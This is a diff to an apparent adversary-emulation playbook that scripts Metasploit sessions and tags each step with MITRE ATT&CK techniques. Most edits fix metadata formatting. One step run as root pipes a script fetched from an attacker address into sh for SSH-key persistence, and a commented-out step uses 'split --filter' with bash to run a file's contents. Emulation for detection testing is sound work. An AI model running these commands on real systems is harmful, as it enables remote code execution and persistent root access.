@@ -65,7 +65,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
-      technique_name:"Ingress Tool Transfer"
+      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     session: "foothold"
@@ -73,7 +73,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
-      technique_name:"Ingress Tool Transfer"
+      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     cmd: shell
@@ -272,6 +272,10 @@ commands:
   - type: msf-session
     session: "root"
     cmd: "curl http://$ATTACKER_ADDRESS/README.txt.1 | sh"
+    metadata:
+      techniques: "T1105,T1098.004"
+      tactics: "Command and Control,Persistence,Privilege Escalation"
+      technique_name:"Ingress Tool Transfer,Account Manipulation: SSH Authorized Keys"
 
   - type: sleep
     seconds: 40
@@ -292,8 +296,9 @@ commands:
 #    cmd: split --filter="/usr/bin/cat $FILE | /usr/bin/xargs /bin/bash -c " -C 2000 /root/README.txt
 #    session: "root"
 #    metadata:
-#      techniques: "T1218,T1098"
+#      techniques: "T1218,T1098.004"
 #      tactics: "Defense Evasion,Persistence,Privilege Escalation"
+#      technique_name: "System Binary Proxy Execution,Account Manipulation: SSH Authorized Keys"
 #
 
 #  - type: msf-session
